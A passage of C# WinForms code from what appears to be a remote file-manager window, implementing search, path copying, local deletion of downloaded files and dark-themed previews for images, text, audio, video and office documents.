                    lstTransfers.BeginUpdate();
                    foreach (ListViewItem item in lstTransfers.Items)
                        item.Selected = true;
                    lstTransfers.EndUpdate();

                    return true;
                }
            }

            // CTRL + F → Search
            if (keyData == (Keys.Control | Keys.F))
            {
                string keyword = Microsoft.VisualBasic.Interaction.InputBox(
                    "Enter search keyword:",
                    "Search Files",
                    "");

                SearchListView(keyword);
                return true;
            }

            // CTRL + C → Copy Paths
            if (keyData == (Keys.Control | Keys.C))
            {
                CopySelectedPaths();
                return true;
            }

            return base.ProcessCmdKey(ref msg, keyData);
        }

        private void searchToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string keyword = Microsoft.VisualBasic.Interaction.InputBox(
                "Enter search keyword:",
                "Search Files",
                "");

            SearchListView(keyword);
        }

        private void CopySelectedPaths()
        {
            if (lstDirectory.SelectedIndices.Count == 0)
                return;

            var paths = new List<string>();

            foreach (int index in lstDirectory.SelectedIndices)
            {
                if (index == 0) // skip ".."
                    continue;

                int cacheIndex = index - 1;
                if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                    continue;

                var entry = _cachedItems[cacheIndex];
                string fullPath = GetAbsolutePath(entry.Name);
                paths.Add(fullPath);
            }

            if (paths.Count == 0)
                return;

            try
            {
                Clipboard.SetText(string.Join(Environment.NewLine, paths));
                SetStatusMessage(this, $"Copied {paths.Count} path(s) to clipboard");
            }
            catch
            {
                MessageBox.Show("Unable to copy paths to clipboard.",
                    "Clipboard Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void copyPathToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CopySelectedPaths();
        }

        // =========================
        // UNIFIED PREVIEW ENTRYPOINT
        // =========================

        private void previewToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PreviewSelectedFile();
        }

        private void PreviewSelectedFile()
        {
            if (lstDirectory.SelectedIndices.Count != 1)
                return;

            int index = lstDirectory.SelectedIndices[0];
            if (index == 0) return;

            var entry = _cachedItems[index - 1];
            if (entry.EntryType != FileType.File)
                return;

            string remotePath = GetAbsolutePath(entry.Name);
            string localPath = Path.Combine(_connectClient.Value.DownloadDirectory, entry.Name);
            long expectedSize = entry.Size;

            EnsurePreviewFile(remotePath, localPath, expectedSize);
        }

        private void EnsurePreviewFile(string remotePath, string localPath, long expectedSize)
        {
            // Start / restart download if missing or obviously incomplete
            if (!File.Exists(localPath) ||
                (expectedSize > 0 && new FileInfo(localPath).Length < expectedSize))
            {
                _fileManagerHandler.BeginDownloadFile(remotePath);
                SetStatusMessage(this, "Downloading preview file...");
            }

            var timer = new System.Windows.Forms.Timer { Interval = 250 };
            timer.Tick += (s, e) =>
            {
                if (!File.Exists(localPath))
                    return;

                long actual = new FileInfo(localPath).Length;

                if (expectedSize > 0 && actual < expectedSize)
                    return;

                timer.Stop();
                timer.Dispose();

                PreviewAnyFile(localPath);
            };
            timer.Start();
        }

        /// <summary>
        /// Single unified preview dispatcher: image, text, audio, video, documents.
        /// </summary>
        private void PreviewAnyFile(string filePath)
        {
            string ext = Path.GetExtension(filePath).ToLowerInvariant();

            string[] imageExt =
            {
                ".png", ".jpg", ".jpeg", ".bmp", ".gif", ".webp"
            };

            string[] textExt =
            {
                ".txt", ".log", ".cfg", ".ini", ".json", ".xml", ".yaml", ".yml",
                ".cs", ".cpp", ".c", ".h", ".py", ".js", ".html", ".css", ".md",
                ".bat", ".ps1"
            };

            string[] audioExt =
            {
                ".mp3", ".wav", ".ogg", ".aac", ".wma", ".m4a"
            };

            string[] videoExt =
            {
                ".mp4", ".avi", ".mov", ".wmv", ".mkv", ".mpeg", ".mpg"
            };

            string[] docExt =
            {
                ".doc", ".docx",
                ".rtf",
                ".pdf",
                ".xls", ".xlsx",
                ".ppt", ".pptx"
            };

            try
            {
                if (imageExt.Contains(ext))
                {
                    ShowImagePreview(filePath);
                }
                else if (textExt.Contains(ext))
                {
                    ShowTextPreview(filePath);
                }
                else if (audioExt.Contains(ext))
                {
                    ShowAudioPreview(filePath);
                }
                else if (videoExt.Contains(ext))
                {
                    ShowVideoPreview(filePath);
                }
                else if (docExt.Contains(ext))
                {
                    ShowDocumentPreview(filePath, ext);
                }
                else
                {
                    MessageBox.Show("Unsupported file type.", "Preview",
                        MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    $"Failed to preview file:\n{ex.Message}",
                    "Preview Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error
                );
            }
        }

        private void ShowDocumentPreview(string filePath, string ext)
        {
            ext = ext.ToLowerInvariant();

            // RTF & DOC via RichTextBox loader
            if (ext == ".rtf" || ext == ".doc")
            {
                try
                {
                    using (var rtb = new RichTextBox())
                    {
                        rtb.LoadFile(filePath);
                        ShowPlainTextDocument(filePath, rtb.Text);
                        return;
                    }
                }
                catch
                {
                    // fallback to plain text read
                }
            }

            string text = ExtractDocumentText(filePath, ext);
            ShowPlainTextDocument(filePath, text);
        }

        private void ShowPlainTextDocument(string filePath, string text)
        {
            Form viewer = new Form();
            viewer.Text = Path.GetFileName(filePath);
            viewer.StartPosition = FormStartPosition.CenterScreen;
            viewer.Size = new Size(900, 700);
            viewer.FormBorderStyle = FormBorderStyle.SizableToolWindow;

            TextBox tb = new TextBox
            {
                Multiline = true,
                ReadOnly = true,
                Dock = DockStyle.Fill,
                ScrollBars = ScrollBars.Both,
                Font = new Font("Consolas", 11),
                WordWrap = false,
                Text = text ?? string.Empty
            };

            viewer.Controls.Add(tb);

            ApplyDarkThemeToPreview(viewer);
            viewer.Shown += (s, e) =>
            {
                ApplyDarkTitleBar(viewer);
                ApplyDarkScrollBars(viewer);
            };

            viewer.Show();
        }

        /// <summary>
        /// Extracts text from DOCX/PPTX/XLSX/PDF using only built-in APIs.
        /// </summary>
        private string ExtractDocumentText(string path, string ext)
        {
            ext = ext.ToLowerInvariant();

            try
            {
                if (ext == ".docx")
                {
                    using var zip = ZipFile.OpenRead(path);
                    var entry = zip.GetEntry("word/document.xml");
                    if (entry == null) return "(Unable to extract DOCX text)";
                    using var r = new StreamReader(entry.Open());
                    return StripXml(r.ReadToEnd());
                }

                if (ext == ".ppt" || ext == ".pptx")
                {
                    using var zip = ZipFile.OpenRead(path);
                    var slides = zip.Entries
                        .Where(e => e.FullName.StartsWith("ppt/slides/slide"))
                        .OrderBy(e => e.FullName)
                        .ToList();

                    var sb = new StringBuilder();
                    foreach (var slide in slides)
                    {
                        using var r = new StreamReader(slide.Open());
                        sb.AppendLine(StripXml(r.ReadToEnd()));
                        sb.AppendLine("\n--------------------------\n");
                    }
                    return sb.ToString();
                }

                if (ext == ".xls" || ext == ".xlsx")
                {
                    using var zip = ZipFile.OpenRead(path);
                    var sheets = zip.Entries
                        .Where(e => e.FullName.StartsWith("xl/worksheets/sheet"))
                        .OrderBy(e => e.FullName)
                        .ToList();

                    var sb = new StringBuilder();
                    foreach (var s in sheets)
                    {
                        using var r = new StreamReader(s.Open());
                        sb.AppendLine(StripXml(r.ReadToEnd()));
                        sb.AppendLine("\n--------------------------\n");
                    }
                    return sb.ToString();
                }

                if (ext == ".pdf")
                {
                    // Very basic PDF text extraction: pull text inside parentheses
                    string pdf = File.ReadAllText(path);
                    bool inside = false;
                    var sb = new StringBuilder();

                    foreach (char c in pdf)
                    {
                        if (c == '(') { inside = true; continue; }
                        if (c == ')') { inside = false; continue; }
                        if (inside && !char.IsControl(c))
                            sb.Append(c);
                    }

                    return sb.Length == 0 ? "(No readable text extracted from PDF)" : sb.ToString();
                }

                // Fallback: treat as plain text
                return File.ReadAllText(path);
            }
            catch
            {
                return "(Unable to extract document content)";
            }
        }

        private string StripXml(string xml)
        {
            bool inside = false;
            var sb = new StringBuilder();

            foreach (char c in xml)
            {
                if (c == '<') { inside = true; continue; }
                if (c == '>') { inside = false; continue; }
                if (!inside && !char.IsControl(c))
                    sb.Append(c);
            }

            return sb.ToString();
        }

        // =========================
        // VIDEO PREVIEW
        // =========================

        private void ShowVideoPreview(string filePath)
        {
            var viewer = new System.Windows.Forms.Form();
            viewer.Text = Path.GetFileName(filePath);
            viewer.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            viewer.Size = new System.Drawing.Size(900, 600);
            viewer.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow;

            viewer.BackColor = System.Drawing.Color.FromArgb(18, 18, 18);
            viewer.ForeColor = System.Drawing.Color.White;

            ApplyDarkTitleBar(viewer);

            var host = new ElementHost
            {
                Dock = DockStyle.Fill,
                BackColor = System.Drawing.Color.FromArgb(18, 18, 18),
                BackColorTransparent = false
            };

            var grid = new System.Windows.Controls.Grid
            {
                Background = new System.Windows.Media.SolidColorBrush(
                    System.Windows.Media.Color.FromRgb(18, 18, 18)
                )
            };

            var media = new System.Windows.Controls.MediaElement
            {
                LoadedBehavior = System.Windows.Controls.MediaState.Manual,
                UnloadedBehavior = System.Windows.Controls.MediaState.Manual,
                Stretch = System.Windows.Media.Stretch.Uniform,
                Volume = 1.0
            };

            grid.Children.Add(media);
            host.Child = grid;

            var seek = new System.Windows.Forms.TrackBar
            {
                Dock = DockStyle.Bottom,
                Height = 28,
                BackColor = System.Drawing.Color.FromArgb(25, 25, 25)
            };

            var timer = new System.Windows.Forms.Timer { Interval = 250 };
            timer.Tick += (s, e) =>
            {
                if (media.NaturalDuration.HasTimeSpan)
                {
                    int max = (int)media.NaturalDuration.TimeSpan.TotalSeconds;
                    seek.Maximum = (max <= 0 ? 1 : max);

                    int value = (int)media.Position.TotalSeconds;
                    if (value >= seek.Minimum && value <= seek.Maximum)
                        seek.Value = value;
                }
            };

            seek.MouseDown += (s, e) => timer.Stop();
            seek.MouseUp += (s, e) =>
            {
                media.Position = TimeSpan.FromSeconds(seek.Value);
                timer.Start();
            };

            var panel = new FlowLayoutPanel
            {
                Height = 42,
                Dock = DockStyle.Bottom,
                BackColor = System.Drawing.Color.FromArgb(30, 30, 30)
            };

            System.Windows.Forms.Button DarkBtnLocal(string text)
            {
                return new System.Windows.Forms.Button
                {
                    Text = text,
                    ForeColor = System.Drawing.Color.White,
                    BackColor = System.Drawing.Color.FromArgb(40, 40, 40),
                    FlatStyle = FlatStyle.Flat,
                    Width = 70,
                    Height = 32,
                    FlatAppearance = { BorderColor = System.Drawing.Color.Black }
                };
            }

            var btnPlay = DarkBtnLocal("Play");
            var btnPause = DarkBtnLocal("Pause");
            var btnStop = DarkBtnLocal("Stop");
            var btnVolDn = DarkBtnLocal("Vol -");
            var btnVolUp = DarkBtnLocal("Vol +");
            var chkLoop = new System.Windows.Forms.CheckBox
            {
                Text = "Loop",
                ForeColor = System.Drawing.Color.White,
                BackColor = System.Drawing.Color.FromArgb(30, 30, 30),
                AutoSize = true,
                Margin = new Padding(10, 6, 0, 0),
                Padding = new Padding(2),
            };

            btnPlay.Click += (s, e) => media.Play();
            btnPause.Click += (s, e) => media.Pause();
            btnStop.Click += (s, e) =>
            {
                media.Stop();
                seek.Value = 0;
            };
            btnVolDn.Click += (s, e) => media.Volume = Math.Max(0, media.Volume - 0.1);
            btnVolUp.Click += (s, e) => media.Volume = Math.Min(1, media.Volume + 0.1);

            void LoopHandler(object s, System.Windows.RoutedEventArgs e)
            {
                media.Position = TimeSpan.Zero;
                media.Play();
            }

            chkLoop.CheckedChanged += (s, e) =>
            {
                if (chkLoop.Checked)
                    media.MediaEnded += LoopHandler;
                else
                    media.MediaEnded -= LoopHandler;
            };

            panel.Controls.Add(btnPlay);
            panel.Controls.Add(btnPause);
            panel.Controls.Add(btnStop);
            panel.Controls.Add(btnVolDn);
            panel.Controls.Add(btnVolUp);
            panel.Controls.Add(chkLoop);

            media.Source = new Uri(filePath);

            viewer.Shown += (s, e) =>
            {
                media.Play();
                timer.Start();
                ApplyDarkScrollBars(viewer);
            };

            viewer.FormClosing += (s, e) =>
            {
                timer.Stop();
                media.Stop();
                media.Close();
            };

            viewer.Controls.Add(host);
            viewer.Controls.Add(seek);
            viewer.Controls.Add(panel);

            viewer.Show();
        }

        // =========================
        // AUDIO PREVIEW
        // =========================

        [DllImport("winmm.dll")]
        private static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr callback);

        private void ShowAudioPreview(string filePath)
        {
            Form viewer = new Form();
            viewer.Text = Path.GetFileName(filePath);
            viewer.StartPosition = FormStartPosition.CenterScreen;
            viewer.Size = new Size(500, 220);
            viewer.FormBorderStyle = FormBorderStyle.SizableToolWindow;

            ApplyDarkThemeToPreview(viewer);
            viewer.Shown += (s, e) => ApplyDarkTitleBar(viewer);

            string alias = "previewAudio";

            mciSendString($"close {alias}", null, 0, IntPtr.Zero);
            mciSendString($"open \"{filePath}\" type mpegvideo alias {alias}", null, 0, IntPtr.Zero);

            var btnPlay = DarkBtn("Play");
            var btnPause = DarkBtn("Pause");
            var btnStop = DarkBtn("Stop");

            var btnVolUp = DarkBtn("Vol +");
            var btnVolDn = DarkBtn("Vol -");

            var chkLoop = new CheckBox
            {
                Text = "Loop",
                ForeColor = Color.White,
                BackColor = viewer.BackColor,
                AutoSize = true,
                Margin = new Padding(10, 6, 0, 0)
            };

            TrackBar seek = new TrackBar
            {
                Dock = DockStyle.Top,
                Height = 30,
                Minimum = 0,
                Maximum = 1000,
                TickStyle = TickStyle.None,
                BackColor = Color.FromArgb(25, 25, 25)
            };

            Label lblTime = new Label
            {
                Text = "00:00 / 00:00",
                ForeColor = Color.White,
                Dock = DockStyle.Top,
                Height = 22,
                TextAlign = ContentAlignment.MiddleCenter
            };

            FlowLayoutPanel panel = new FlowLayoutPanel
            {
                Dock = DockStyle.Bottom,
                Height = 55,
                BackColor = Color.FromArgb(30, 30, 30)
            };

            panel.Controls.Add(btnPlay);
            panel.Controls.Add(btnPause);
            panel.Controls.Add(btnStop);
            panel.Controls.Add(btnVolDn);
            panel.Controls.Add(btnVolUp);
            panel.Controls.Add(chkLoop);

            viewer.Controls.Add(panel);
            viewer.Controls.Add(lblTime);
            viewer.Controls.Add(seek);

            int GetLengthMs()
            {
                StringBuilder sb = new StringBuilder(128);
                mciSendString($"status {alias} length", sb, sb.Capacity, IntPtr.Zero);
                if (int.TryParse(sb.ToString(), out int len))
                    return len;
                return 0;
            }

            int GetPositionMs()
            {
                StringBuilder sb = new StringBuilder(128);
                mciSendString($"status {alias} position", sb, sb.Capacity, IntPtr.Zero);
                if (int.TryParse(sb.ToString(), out int pos))
                    return pos;
                return 0;
            }

            void SetPositionMs(int ms)
            {
                mciSendString($"seek {alias} to {ms}", null, 0, IntPtr.Zero);
            }

            int length = 0;

            viewer.Shown += (s, e) =>
            {
                length = GetLengthMs();
                if (length > 0)
                    seek.Maximum = length;

                mciSendString($"play {alias}", null, 0, IntPtr.Zero);
            };

            var timer = new System.Windows.Forms.Timer { Interval = 100 };
            timer.Tick += (s, e) =>
            {
                int pos = GetPositionMs();
                if (pos <= seek.Maximum)
                    seek.Value = pos;

                string cur = TimeSpan.FromMilliseconds(pos).ToString(@"mm\:ss");
                string tot = TimeSpan.FromMilliseconds(length).ToString(@"mm\:ss");
                lblTime.Text = $"{cur} / {tot}";

                if (pos >= length - 50) // reached end
                {
                    if (chkLoop.Checked)
                        mciSendString($"play {alias} from 0", null, 0, IntPtr.Zero);
                }
            };
            timer.Start();

            btnPlay.Click += (s, e) => mciSendString($"play {alias}", null, 0, IntPtr.Zero);
            btnPause.Click += (s, e) => mciSendString($"pause {alias}", null, 0, IntPtr.Zero);
            btnStop.Click += (s, e) =>
            {
                mciSendString($"stop {alias}", null, 0, IntPtr.Zero);
                SetPositionMs(0);
                seek.Value = 0;
            };

            btnVolUp.Click += (s, e) => mciSendString($"setaudio {alias} volume to +500", null, 0, IntPtr.Zero);
        btnVolDn_Click:
            btnVolDn.Click += (s, e) => mciSendString($"setaudio {alias} volume to -500", null, 0, IntPtr.Zero);

            seek.MouseDown += (s, e) => timer.Stop();
            seek.MouseUp += (s, e) =>
            {
                SetPositionMs(seek.Value);
                timer.Start();
            };

            viewer.FormClosing += (s, e) =>
            {
                timer.Stop();
                mciSendString($"stop {alias}", null, 0, IntPtr.Zero);
                mciSendString($"close {alias}", null, 0, IntPtr.Zero);
            };

            viewer.Show();
        }

        // ------------------------ DARK MODE BUTTON HELPER ------------------------
        private Button DarkBtn(string text)
        {
            return new Button
            {
                Text = text,
                ForeColor = Color.White,
                BackColor = Color.FromArgb(40, 40, 40),
                FlatStyle = FlatStyle.Flat,
                Width = 75,
                Height = 32,
                Margin = new Padding(5),
                FlatAppearance = { BorderColor = Color.Black }
            };
        }

        private void ShowTextPreview(string filePath)
        {
            string textContent = File.ReadAllText(filePath);

            Form viewer = new Form();
            viewer.Text = Path.GetFileName(filePath);
            viewer.StartPosition = FormStartPosition.CenterScreen;
            viewer.Size = new Size(900, 700);
            viewer.FormBorderStyle = FormBorderStyle.SizableToolWindow;

            TextBox tb = new TextBox();
            tb.Multiline = true;
            tb.ReadOnly = true;
            tb.Dock = DockStyle.Fill;
            tb.ScrollBars = ScrollBars.Both;
            tb.Font = new Font("Consolas", 11);
            tb.WordWrap = false;
            tb.Text = textContent;

            viewer.Controls.Add(tb);

            ApplyDarkThemeToPreview(viewer);

            viewer.Shown += (s, e) =>
            {
                ApplyDarkTitleBar(viewer);
                ApplyDarkScrollBars(viewer);
            };

            viewer.Show();
        }

        private void ApplyDarkThemeToPreview(Form viewer)
        {
            viewer.BackColor = Color.FromArgb(18, 18, 18);  // Near-black
            viewer.ForeColor = Color.White;

            foreach (Control c in viewer.Controls)
            {
                c.BackColor = viewer.BackColor;
                c.ForeColor = viewer.ForeColor;

                if (c is TextBox tb)
                {
                    tb.BorderStyle = BorderStyle.None;
                }
                if (c is PictureBox pb)
                {
                    pb.BackColor = viewer.BackColor;
                }
            }
        }

        private void ShowImagePreview(string filePath)
        {
            Form viewer = new Form();
            viewer.Text = Path.GetFileName(filePath);
            viewer.StartPosition = FormStartPosition.CenterScreen;
            viewer.Size = new Size(900, 700);
            viewer.FormBorderStyle = FormBorderStyle.SizableToolWindow;

            PictureBox pb = new PictureBox();
            pb.Dock = DockStyle.Fill;
            pb.SizeMode = PictureBoxSizeMode.Zoom;
            pb.Image = LoadImageSafely(filePath);

            viewer.Controls.Add(pb);

            ApplyDarkThemeToPreview(viewer);
            viewer.Shown += (s, e) => ApplyDarkTitleBar(viewer);

            viewer.Show();
        }

        // -------------- DWM DARK MODE TITLE BAR + BORDER ----------------
        [DllImport("dwmapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int value, int size);

        private const int DWMWA_USE_IMMERSIVE_DARK_MODE = 20;
        private const int DWMWA_BORDER_COLOR = 34;

        private void ApplyDarkTitleBar(Form form)
        {
            try
            {
                int useDark = 1;
                DwmSetWindowAttribute(form.Handle, DWMWA_USE_IMMERSIVE_DARK_MODE, ref useDark, sizeof(int));

                int borderColor = Color.FromArgb(30, 30, 30).ToArgb();
                DwmSetWindowAttribute(form.Handle, DWMWA_BORDER_COLOR, ref borderColor, sizeof(int));
            }
            catch { }
        }

        // -------------------- DARK SCROLLBARS (WIN10/11) --------------------
        [DllImport("uxtheme.dll", ExactSpelling = true, CharSet = CharSet.Unicode)]
        private static extern int SetWindowTheme(IntPtr hWnd, string pszSubAppName, string pszSubIdList);

        private void ApplyDarkScrollBars(Control control)
        {
            if (!control.IsHandleCreated)
            {
                control.HandleCreated += (s, e) => ApplyDarkScrollBars(control);
                return;
            }

            SetWindowTheme(control.Handle, "DarkMode_Explorer", null);

            foreach (Control child in control.Controls)
                ApplyDarkScrollBars(child);
        }

        private void deleteFileFromServerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstTransfers.SelectedItems.Count == 0)
                return;

            HashSet<string> filenames = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            foreach (ListViewItem item in lstTransfers.SelectedItems)
            {
                if (item.Tag is FileTransfer t)
                    filenames.Add(Path.GetFileName(t.RemotePath));
            }

            if (filenames.Count == 0)
                return;

            if (MessageBox.Show(
                    $"Delete {filenames.Count} downloaded file(s) from local disk?",
                    "Delete Local Files",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning
                ) != DialogResult.Yes)
            {
                return;
            }

            foreach (var fileName in filenames)
            {
                string localPath = Path.Combine(_connectClient.Value.DownloadDirectory, fileName);

                try
                {
                    if (File.Exists(localPath))
                    {
                        File.Delete(localPath);
                        SetStatusMessage(this, $"Deleted: {localPath}");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(
                        $"Failed to delete:\n{localPath}\n\n{ex.Message}",
                        "Delete Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error
                    );
                }
            }

            for (int i = lstTransfers.Items.Count - 1; i >= 0; i--)
            {
                var lvItem = lstTransfers.Items[i];
                if (lvItem.Tag is FileTransfer t)
                {
                    string name = Path.GetFileName(t.RemotePath);
                    if (filenames.Contains(name))
                        lstTransfers.Items.RemoveAt(i);
                }
            }
        }

        private Image LoadImageSafely(string path)
        {
            try
            {
                using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                using (var temp = Image.FromStream(fs, useEmbeddedColorManagement: false, validateImageData: false))
                {
                    return new Bitmap(temp);
                }
            }
            catch
            {
                Bitmap bmp = new Bitmap(800, 600);
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.Clear(Color.Black);
                    g.DrawString("Unable to display image",
                        new Font("Segoe UI", 18), Brushes.White, new PointF(20, 20));
                }
                return bmp;
            }
        }

        /// <summary>
        /// Adds all locally existing downloaded files as completed transfers.
        /// </summary>
        private void LoadExistingLocalDownloads()
        {
            string folder = _connectClient.Value.DownloadDirectory;

            if (!Directory.Exists(folder))
                return;

            var files = Directory.GetFiles(folder);

            foreach (var file in files)
            {
                string fileName = Path.GetFileName(file);

                bool exists = false;
                foreach (ListViewItem itm in lstTransfers.Items)
                {
                    if (itm.SubItems[(int)TransferColumn.Status].Text == "Completed" &&
                        Path.GetFileName(itm.SubItems[3].Text) == fileName)
                    {
                        exists = true;
                        break;
                    }
                }

                if (exists)
                    continue;

                var fake = new FileTransfer
                {
                    Id = 0,
                    Type = TransferType.Download,
                    Status = "Completed",
                    RemotePath = fileName,
                    LocalPath = file
                };

                var lvi = new ListViewItem(new[]
                {
                    File.GetLastWriteTime(file).ToString("yyyy-MM-dd HH:mm"),
                    fake.Type.ToString(),
                    fake.Status,
                    fake.RemotePath
                })
                {
                    Tag = fake,
                    ImageIndex = GetTransferImageIndex("Completed")
                };

                lstTransfers.Items.Add(lvi);
            }
        }

        private void previewTransferFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PreviewTransferFile();
        }

        private void PreviewTransferFile()
        {
            if (lstTransfers.SelectedItems.Count != 1)
                return;

            var item = lstTransfers.SelectedItems[0];
            if (item.Tag is not FileTransfer transfer)
                return;

            string fileName = Path.GetFileName(transfer.RemotePath);
            string localPath = Path.Combine(_connectClient.Value.DownloadDirectory, fileName);
            string remotePath = transfer.RemotePath;
            long expectedSize = transfer.Size;

            EnsurePreviewFile(remotePath, localPath, expectedSize);
        }

        // ------------------------ RedrawScope ------------------------
        internal readonly struct RedrawScope : IDisposable
        {
            private readonly Control _ctl;
            private readonly IntPtr _handle;

            [DllImport("user32.dll")]
            private static extern IntPtr SendMessage(IntPtr hWnd, int msg, int wParam, int lParam);

            private const int WM_SETREDRAW = 0x0B;

            public RedrawScope(Control c)
            {
                _ctl = c;
                _handle = c.IsHandleCreated ? c.Handle : IntPtr.Zero;
                if (_handle != IntPtr.Zero)
                    SendMessage(_handle, WM_SETREDRAW, 0, 0); // stop redraw
            }

            public void Dispose()
            {
                if (_handle != IntPtr.Zero)
                {
                    SendMessage(_handle, WM_SETREDRAW, 1, 0); // resume redraw
                    _ctl.Invalidate();
                }
            }
        }
        // -----------------------------------------------------------------
    }
}
